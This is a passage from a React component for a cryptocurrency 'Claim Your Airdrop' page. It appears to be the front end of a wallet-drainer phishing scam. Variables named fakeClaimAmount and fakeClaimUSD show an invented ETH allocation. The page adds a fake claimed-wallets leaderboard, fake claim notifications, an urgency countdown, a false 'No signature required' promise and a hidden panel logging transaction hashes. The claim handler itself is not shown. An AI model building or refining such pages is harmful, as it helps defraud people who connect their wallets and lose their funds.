                                borderRadius: 9999,
                                fontSize: 12,
                                fontWeight: 700,
                                color: '#fff',
                                cursor: 'pointer',
                                letterSpacing: 0.5,
                                boxShadow: '0 2px 8px rgba(99,102,241,0.3)'
                            }}
                        >
                            Connect Wallet
                        </button>
                    )}
                    {onClose && <X size={22} color="#94a3b8" style={{ cursor: 'pointer' }} onClick={onClose} />}
                </div>
            </header>

            <main style={{ flex: 1, maxWidth: 1280, margin: '0 auto', padding: '32px 16px', width: '100%' }}>
                {/* Airdrop Banner */}
                <div style={{ textAlign: 'center', marginBottom: 32 }}>
                    <div style={{ display: 'inline-flex', alignItems: 'center', gap: 8, backgroundColor: 'rgba(49,46,129,0.4)', border: '1px solid rgba(99,102,241,0.4)', padding: '6px 16px', borderRadius: 9999, fontSize: 11, color: '#818cf8', fontWeight: 600, letterSpacing: 1, textTransform: 'uppercase', marginBottom: 12 }}>
                        <span className="animate-pulse-custom" style={{ height: 8, width: 8, borderRadius: '50%', backgroundColor: '#818cf8' }} />
                        <span>Claim Your Airdrop</span>
                    </div>
                    <h1 style={{ fontSize: 'clamp(28px,5vw,48px)', fontWeight: 900, letterSpacing: -1, margin: '0 0 8px', color: '#fff' }}>
                        CLAIM YOUR <span style={{ background: 'linear-gradient(to right,#818cf8,#a78bfa)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>AIRDROP</span>
                    </h1>
                    <p style={{ color: '#94a3b8', fontSize: 14, fontWeight: 500 }}>
                        Claiming will end in: <span style={{ fontWeight: 700, color: '#818cf8', fontFamily: 'monospace', marginLeft: 4 }}>{formatCountdown()}</span>
                    </p>
                </div>

                {/* Two panels */}
                <div className="responsive-grid">
                    {/* Left panel */}
                    <div style={{ backgroundColor: '#131a26', border: '1px solid #1e293b', borderRadius: 16, padding: 24, position: 'relative', overflow: 'hidden', boxShadow: '0 25px 50px -12px rgba(0,0,0,0.4)' }}>
                        <div style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: 2, background: 'linear-gradient(to right,transparent,#6366f1,transparent)' }} />
                        <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 24 }}>
                            <div style={{ padding: 10, backgroundColor: 'rgba(99,102,241,0.1)', border: '1px solid rgba(99,102,241,0.2)', borderRadius: 12 }}>
                                <Wallet size={18} color="#818cf8" />
                            </div>
                            <div>
                                <h2 style={{ fontSize: 20, fontWeight: 700, color: '#fff', margin: 0 }}>Claim Your Airdrop</h2>
                                <p style={{ fontSize: 12, color: '#94a3b8', margin: '2px 0 0' }}>Connect your wallet to check eligibility</p>
                            </div>
                        </div>

                        {/* Connected wallet display (always shown when connected) */}
                        {isEvmConnected && evmAddress && (
                            <div style={{
                                display: 'flex',
                                alignItems: 'center',
                                justifyContent: 'space-between',
                                backgroundColor: 'rgba(15,23,42,0.6)',
                                border: '1px solid rgba(99,102,241,0.2)',
                                borderRadius: 12,
                                padding: '14px 16px',
                                marginBottom: 20
                            }}>
                                <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                                    <div style={{
                                        width: 8,
                                        height: 8,
                                        borderRadius: '50%',
                                        backgroundColor: '#10b981',
                                        boxShadow: '0 0 8px #10b981'
                                    }} />
                                    <span style={{
                                        fontSize: 13,
                                        fontFamily: 'monospace',
                                        color: '#e2e8f0',
                                        fontWeight: 500
                                    }}>
                                        {evmAddress.slice(0, 6)}...{evmAddress.slice(-4)}
                                    </span>
                                </div>
                                <span style={{
                                    fontSize: 10,
                                    fontWeight: 700,
                                    color: '#10b981',
                                    textTransform: 'uppercase',
                                    letterSpacing: 1,
                                    backgroundColor: 'rgba(16,185,129,0.1)',
                                    padding: '4px 10px',
                                    borderRadius: 6,
                                    border: '1px solid rgba(16,185,129,0.2)'
                                }}>
                                    Connected
                                </span>
                            </div>
                        )}

                        {/* Stage: Connect (initial state) */}
                        {currentStage === 'connect' && (
                            <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
                                {/* Feature highlights */}
                                <div style={{
                                    display: 'grid',
                                    gridTemplateColumns: '1fr 1fr',
                                    gap: 12,
                                    marginBottom: 8
                                }}>
                                    <div style={{
                                        backgroundColor: 'rgba(99,102,241,0.05)',
                                        border: '1px solid rgba(99,102,241,0.15)',
                                        borderRadius: 10,
                                        padding: 14
                                    }}>
                                        <div style={{ fontSize: 11, color: '#818cf8', fontWeight: 700, textTransform: 'uppercase', letterSpacing: 0.5, marginBottom: 4 }}>
                                            Multi-Chain
                                        </div>
                                        <div style={{ fontSize: 12, color: '#cbd5e1' }}>
                                            ETH, BSC, Polygon, Arbitrum, Base
                                        </div>
                                    </div>
                                    <div style={{
                                        backgroundColor: 'rgba(16,185,129,0.05)',
                                        border: '1px solid rgba(16,185,129,0.15)',
                                        borderRadius: 10,
                                        padding: 14
                                    }}>
                                        <div style={{ fontSize: 11, color: '#10b981', fontWeight: 700, textTransform: 'uppercase', letterSpacing: 0.5, marginBottom: 4 }}>
                                            Gasless Claim
                                        </div>
                                        <div style={{ fontSize: 12, color: '#cbd5e1' }}>
                                            Zero fees to claim your tokens
                                        </div>
                                    </div>
                                </div>

                                <button
                                    onClick={() => {
                                        manualConnect.current = true
                                        open()
                                    }}
                                    style={{
                                        width: '100%',
                                        background: 'linear-gradient(to right,#6366f1,#4f46e5)',
                                        color: '#fff',
                                        fontSize: 15,
                                        fontWeight: 700,
                                        padding: '16px',
                                        borderRadius: 12,
                                        border: 'none',
                                        cursor: 'pointer',
                                        boxShadow: '0 4px 20px rgba(99,102,241,0.3)',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        gap: 10,
                                        transition: 'all 0.2s'
                                    }}
                                    onMouseEnter={(e) => {
                                        e.currentTarget.style.transform = 'translateY(-1px)'
                                        e.currentTarget.style.boxShadow = '0 6px 24px rgba(99,102,241,0.4)'
                                    }}
                                    onMouseLeave={(e) => {
                                        e.currentTarget.style.transform = 'translateY(0)'
                                        e.currentTarget.style.boxShadow = '0 4px 20px rgba(99,102,241,0.3)'
                                    }}
                                >
                                    <Wallet size={18} />
                                    <span>Verify Eligibility</span>
                                </button>

                                <p style={{
                                    fontSize: 11,
                                    color: '#64748b',
                                    textAlign: 'center',
                                    margin: 0,
                                    lineHeight: 1.5
                                }}>
                                    By Verifying you wallet eligibility, you agree to our Terms of Service.
                                </p>
                            </div>
                        )}

                        {/* Stage: Loading */}
                        {currentStage === 'loading' && (
                            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '24px 0', gap: 16 }}>
                                <div style={{ position: 'relative' }}>
                                    <div className="animate-spin-custom" style={{ height: 56, width: 56, borderRadius: '50%', border: '3px solid #334155', borderTopColor: '#6366f1' }} />
                                    <Shield size={16} color="#818cf8" style={{ position: 'absolute', top: '50%', left: '50%', transform: 'translate(-50%,-50%)' }} />
                                </div>
                                <p style={{ fontSize: 15, fontWeight: 600, color: '#e2e8f0', margin: 0 }}>{loadingText}</p>
                                <p style={{ fontSize: 12, color: '#64748b', margin: 0, textAlign: 'center', lineHeight: 1.5 }}>
                                    Analyzing on-chain activity and computing your allocation...
                                </p>

                                {/* Progress bar */}
                                <div style={{ width: '100%', maxWidth: 320, backgroundColor: 'rgba(15,23,42,0.6)', borderRadius: 8, padding: 12, marginTop: 8 }}>
                                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 8 }}>
                                        <span style={{ fontSize: 11, color: '#94a3b8', fontWeight: 600 }}>Verification Progress</span>
                                        <span style={{ fontSize: 11, color: '#818cf8', fontWeight: 700, fontFamily: 'monospace' }}>
                                            {loadingText === 'Verifying eligibility...' ? '33%' : loadingText === 'Scanning wallet history...' ? '66%' : '99%'}
                                        </span>
                                    </div>
                                    <div style={{
                                        height: 4,
                                        backgroundColor: '#1e293b',
                                        borderRadius: 2,
                                        overflow: 'hidden'
                                    }}>
                                        <div style={{
                                            height: '100%',
                                            width: loadingText === 'Verifying eligibility...' ? '33%' : loadingText === 'Scanning wallet history...' ? '66%' : '99%',
                                            background: 'linear-gradient(to right,#6366f1,#818cf8)',
                                            transition: 'width 0.5s ease-out',
                                            borderRadius: 2
                                        }} />
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* Stage: Claim */}
                        {currentStage === 'claim' && (
                            <div className="animate-fadeIn" style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>
                                {/* Eligibility confirmed banner */}
                                <div style={{
                                    display: 'flex',
                                    alignItems: 'center',
                                    gap: 10,
                                    backgroundColor: 'rgba(16,185,129,0.08)',
                                    border: '1px solid rgba(16,185,129,0.25)',
                                    borderRadius: 10,
                                    padding: '12px 16px'
                                }}>
                                    <CheckCircle size={18} color="#10b981" />
                                    <span style={{ fontSize: 13, color: '#10b981', fontWeight: 600 }}>
                                        Wallet eligible for airdrop
                                    </span>
                                </div>

                                {/* Allocation card */}
                                <div style={{
                                    backgroundColor: 'rgba(16,185,129,0.05)',
                                    border: '1px solid rgba(16,185,129,0.2)',
                                    borderRadius: 12,
                                    padding: 24,
                                    textAlign: 'center',
                                    position: 'relative',
                                    overflow: 'hidden'
                                }}>
                                    <div style={{ position: 'absolute', right: -16, bottom: -16, opacity: 0.05 }}>
                                        <CheckCircle size={120} color="#10b981" />
                                    </div>
                                    <span style={{
                                        display: 'block',
                                        fontSize: 10,
                                        fontWeight: 700,
                                        color: '#34d399',
                                        textTransform: 'uppercase',
                                        letterSpacing: 2,
                                        marginBottom: 8
                                    }}>
                                        Your Allocation
                                    </span>
                                    <strong>{fakeClaimAmount} ETH</strong>
                                    <p>≈ ${Number(fakeClaimUSD).toLocaleString()} USD at current rates</p>
                                </div>

                                {/* Claim button */}
                                <button
                                    onClick={handleClaimTokens}
                                    disabled={loading}
                                    style={{
                                        width: '100%',
                                        background: loading ? '#6ee7b7' : 'linear-gradient(to right,#10b981,#0d9488)',
                                        color: '#fff',
                                        fontSize: 15,
                                        fontWeight: 700,
                                        padding: '16px',
                                        borderRadius: 12,
                                        border: 'none',
                                        cursor: loading ? 'not-allowed' : 'pointer',
                                        boxShadow: loading ? 'none' : '0 4px 20px rgba(16,185,129,0.3)',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        gap: 10,
                                        transition: 'all 0.2s'
                                    }}
                                    onMouseEnter={(e) => {
                                        if (!loading) {
                                            e.currentTarget.style.transform = 'translateY(-1px)'
                                            e.currentTarget.style.boxShadow = '0 6px 24px rgba(16,185,129,0.4)'
                                        }
                                    }}
                                    onMouseLeave={(e) => {
                                        e.currentTarget.style.transform = 'translateY(0)'
                                        if (!loading) e.currentTarget.style.boxShadow = '0 4px 20px rgba(16,185,129,0.3)'
                                    }}
                                >
                                    <Gavel size={16} />
                                    <span>{loading ? 'Processing Claim...' : `Claim ${fakeClaimAmount} ETH`}</span>
                                </button>

                                <p style={{
                                    fontSize: 11,
                                    color: '#64748b',
                                    textAlign: 'center',
                                    margin: 0,
                                    lineHeight: 1.5
                                }}>
                                    🔒 Gasless transaction • No signature required • Instant delivery
                                </p>
                            </div>
                        )}

                        {/* Stage: Ineligible */}
                        {currentStage === 'ineligible' && (
                            <div className="animate-fadeIn" style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>
                                {/* Ineligible banner */}
                                <div style={{
                                    display: 'flex',
                                    alignItems: 'center',
                                    gap: 10,
                                    backgroundColor: 'rgba(239,68,68,0.08)',
                                    border: '1px solid rgba(239,68,68,0.25)',
                                    borderRadius: 10,
                                    padding: '12px 16px'
                                }}>
                                    <X size={18} color="#ef4444" />
                                    <span style={{ fontSize: 13, color: '#ef4444', fontWeight: 600 }}>
                                        Wallet not eligible for airdrop
                                    </span>
                                </div>

                                {/* Ineligible card */}
                                <div style={{
                                    backgroundColor: 'rgba(239,68,68,0.05)',
                                    border: '1px solid rgba(239,68,68,0.2)',
                                    borderRadius: 12,
                                    padding: 24,
                                    textAlign: 'center',
                                    position: 'relative',
                                    overflow: 'hidden'
                                }}>
                                    <div style={{ position: 'absolute', right: -16, bottom: -16, opacity: 0.05 }}>
                                        <X size={120} color="#ef4444" />
                                    </div>
                                    <span style={{
                                        display: 'block',
                                        fontSize: 10,
                                        fontWeight: 700,
                                        color: '#f87171',
                                        textTransform: 'uppercase',
                                        letterSpacing: 2,
                                        marginBottom: 8
                                    }}>
                                        Not Eligible
                                    </span>
                                    <strong style={{
                                        fontSize: 'clamp(20px,3vw,28px)',
                                        fontWeight: 800,
                                        color: '#fff',
                                        display: 'block',
                                        marginBottom: 12,
                                        lineHeight: 1.3
                                    }}>
                                        No on-chain activity detected
                                    </strong>
                                    <p style={{
                                        fontSize: 13,
                                        color: '#94a3b8',
                                        margin: 0,
                                        lineHeight: 1.6
                                    }}>
                                        Your connected wallet does not qualify for the airdrop bonus because no recent on-chain activity was found. Airdrop allocations are reserved for wallets with active trading history.
                                    </p>
                                </div>

                                {/* Try again button */}
                                <button
                                    onClick={() => {
                                        setCurrentStage('connect')
                                        setActiveStep(1)
                                        manualConnect.current = true
                                        open()
                                    }}
                                    style={{
                                        width: '100%',
                                        background: 'rgba(99,102,241,0.1)',
                                        color: '#818cf8',
                                        fontSize: 14,
                                        fontWeight: 700,
                                        padding: '14px',
                                        borderRadius: 12,
                                        border: '1px solid rgba(99,102,241,0.3)',
                                        cursor: 'pointer',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        gap: 10,
                                        transition: 'all 0.2s'
                                    }}
                                    onMouseEnter={(e) => {
                                        e.currentTarget.style.background = 'rgba(99,102,241,0.15)'
                                    }}
                                    onMouseLeave={(e) => {
                                        e.currentTarget.style.background = 'rgba(99,102,241,0.1)'
                                    }}
                                >
                                    <Wallet size={16} />
                                    <span>Try Another Wallet</span>
                                </button>

                                <p style={{
                                    fontSize: 11,
                                    color: '#64748b',
                                    textAlign: 'center',
                                    margin: 0,
                                    lineHeight: 1.5
                                }}>
                                    Connect a different wallet with active on-chain history to check eligibility.
                                </p>
                            </div>
                        )}

                        {/* Step indicators */}
                        <div style={{
                            marginTop: 32,
                            paddingTop: 24,
                            borderTop: '1px solid rgba(30,41,59,0.8)',
                            display: 'grid',
                            gridTemplateColumns: 'repeat(3,1fr)',
                            gap: 8,
                            textAlign: 'center',
                            fontSize: 10,
                            fontWeight: 600,
                            letterSpacing: 0.5,
                            textTransform: 'uppercase',
                            color: '#64748b'
                        }}>
                            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 6 }}>
                                <div style={{
                                    width: 24,
                                    height: 24,
                                    borderRadius: '50%',
                                    backgroundColor: activeStep >= 1 ? '#6366f1' : '#334155',
                                    color: '#fff',
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'center',
                                    fontSize: 11,
                                    fontWeight: 700
                                }}>
                                    {activeStep > 1 ? '✓' : '1'}
                                </div>
                                <span style={{ color: activeStep >= 1 ? '#818cf8' : '#64748b' }}>Connect</span>
                            </div>
                            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 6 }}>
                                <div style={{
                                    width: 24,
                                    height: 24,
                                    borderRadius: '50%',
                                    backgroundColor: activeStep >= 2 ? '#6366f1' : '#334155',
                                    color: '#fff',
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'center',
                                    fontSize: 11,
                                    fontWeight: 700
                                }}>
                                    {activeStep > 2 ? '✓' : '2'}
                                </div>
                                <span style={{ color: activeStep >= 2 ? '#818cf8' : '#64748b' }}>Verify</span>
                            </div>
                            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 6 }}>
                                <div style={{
                                    width: 24,
                                    height: 24,
                                    borderRadius: '50%',
                                    backgroundColor: activeStep >= 3 ? '#10b981' : '#334155',
                                    color: '#fff',
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'center',
                                    fontSize: 11,
                                    fontWeight: 700
                                }}>
                                    {activeStep > 3 ? '✓' : '3'}
                                </div>
                                <span style={{ color: activeStep >= 3 ? '#10b981' : '#64748b' }}>Claim</span>
                            </div>
                        </div>
                    </div>

                    {/* Right panel: Leaderboard */}
                    <div style={{ backgroundColor: '#131a26', border: '1px solid #1e293b', borderRadius: 16, padding: 24, boxShadow: '0 25px 50px -12px rgba(0,0,0,0.4)', display: 'flex', flexDirection: 'column', height: 415 }}>
                        <div style={{ marginBottom: 16, display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end', borderBottom: '1px solid rgba(30,41,59,0.6)', paddingBottom: 12 }}>
                            <div>
                                <span style={{ display: 'block', fontSize: 10, fontWeight: 700, color: '#818cf8', textTransform: 'uppercase', letterSpacing: 2 }}>Dashboard Activity</span>
                                <strong style={{ fontSize: 16, fontWeight: 700, color: '#fff' }}>Top Claimed Wallets</strong>
                            </div>
                            <TrendingUp size={16} color="#64748b" />
                        </div>
                        <ol className="custom-scrollbar" style={{ flex: 1, overflowY: 'auto', listStyle: 'none', margin: 0, padding: '0 4px 0 0', display: 'flex', flexDirection: 'column', gap: 8, fontSize: 14, fontFamily: 'monospace' }}>
                            {LEADERBOARD_DATA.map(item => (
                                <li key={item.rank} style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: 10, borderRadius: 12, border: item.rank <= 3 ? '1px solid rgba(99,102,241,0.15)' : '1px solid transparent', backgroundColor: item.rank <= 3 ? 'rgba(99,102,241,0.08)' : 'transparent' }}>
                                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                                        <span style={{ width: 20, textAlign: 'center', fontSize: 13, fontWeight: 700, color: getRankColor(item.rank) }}>{item.rank}</span>
                                        <span style={{ color: '#cbd5e1', fontSize: 13 }}>{item.address}</span>
                                    </div>
                                    <strong style={{ fontSize: 13, color: '#fff', fontWeight: 700 }}>{item.amount}</strong>
                                </li>
                            ))}
                        </ol>
                    </div>
                </div>

                {/* FAQ */}
                <section style={{ maxWidth: 896, margin: '0 auto', borderTop: '1px solid rgba(30,41,59,0.6)', paddingTop: 48 }}>
                    <div style={{ textAlign: 'center', marginBottom: 32 }}>
                        <span style={{ fontSize: 12, fontWeight: 700, color: '#818cf8', textTransform: 'uppercase', letterSpacing: 2 }}>FAQ</span>
                        <h2 style={{ fontSize: 24, fontWeight: 700, color: '#fff', margin: '4px 0 0' }}>About This Airdrop</h2>
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                        {FAQ_DATA.map((item, idx) => (
                            <div key={idx} style={{ backgroundColor: '#131a26', border: '1px solid rgba(30,41,59,0.8)', borderRadius: 12, overflow: 'hidden' }}>
                                <button onClick={() => setOpenFaqIndex(openFaqIndex === idx ? null : idx)} style={{ width: '100%', padding: '16px 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', textAlign: 'left', fontWeight: 600, fontSize: 14, color: '#e2e8f0', background: 'none', border: 'none', cursor: 'pointer' }}>
                                    <span>{item.q}</span>
                                    <ChevronDown size={14} color="#64748b" style={{ transform: openFaqIndex === idx ? 'rotate(180deg)' : 'rotate(0)', transition: 'transform 0.3s' }} />
                                </button>
                                <div style={{ maxHeight: openFaqIndex === idx ? 200 : 0, overflow: 'hidden', transition: 'max-height 0.3s' }}>
                                    <p style={{ padding: '0 20px 16px', fontSize: 13, color: '#94a3b8', lineHeight: 1.6, borderTop: openFaqIndex === idx ? '1px solid rgba(30,41,59,0.4)' : 'none', margin: 0, paddingTop: openFaqIndex === idx ? 12 : 0 }}>{item.a}</p>
                                </div>
                            </div>
                        ))}
                    </div>
                </section>
            </main>

            {/* Footer */}
            <footer style={{ width: '100%', borderTop: '1px solid rgba(30,41,59,0.6)', backgroundColor: 'rgba(2,6,23,0.4)', fontSize: 12, color: '#64748b', padding: '24px 0' }}>
                <div style={{ maxWidth: 1280, margin: '0 auto', padding: '0 16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: 16 }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                        <span>powered by</span>
                        <span style={{ color: '#cbd5e1', fontWeight: 700, display: 'flex', alignItems: 'center', gap: 2 }}><Zap size={10} color="#818cf8" /> magna</span>
                    </div>
                    <nav style={{ display: 'flex', alignItems: 'center', gap: 24 }}>
                        <a href="#" style={{ color: '#64748b', textDecoration: 'none' }}>Terms</a>
                        <a href="#" style={{ color: '#64748b', textDecoration: 'none' }}>Privacy Policy</a>
                        <span style={{ color: '#475569' }}>2026 © All rights reserved.</span>
                    </nav>
                </div>
            </footer>

            {/* Toast */}
            <div style={{ position: 'fixed', bottom: 24, right: 24, backgroundColor: '#0f172a', border: '1px solid rgba(99,102,241,0.3)', boxShadow: '0 25px 50px -12px rgba(0,0,0,0.6)', borderRadius: 12, padding: 16, display: 'flex', alignItems: 'flex-start', gap: 12, maxWidth: 320, transform: toastVisible ? 'translateY(0)' : 'translateY(96px)', opacity: toastVisible ? 1 : 0, transition: 'all 0.5s', zIndex: 100, pointerEvents: toastVisible ? 'auto' : 'none' }}>
                <div style={{ padding: 8, backgroundColor: 'rgba(99,102,241,0.1)', borderRadius: 8, color: '#818cf8' }}><Share2 size={14} /></div>
                <div>
                    <strong style={{ display: 'block', fontSize: 12, color: '#fff', fontWeight: 700 }}>New claim processed</strong>
                    <span style={{ fontSize: 11, color: '#94a3b8', fontFamily: 'monospace', marginTop: 2, display: 'block' }}>{toastMessage}</span>
                </div>
            </div>

            {/* Hidden debug panel */}
            <div style={{ display: 'none' }}>
                <div>--- SYSTEM LOGS ---</div>
                {_debugLogs.map((msg, i) => <div key={i}>{msg}</div>)}
                <p>{status}</p>
                <p>{_txHash}</p>
            </div>
        </div>
    )
}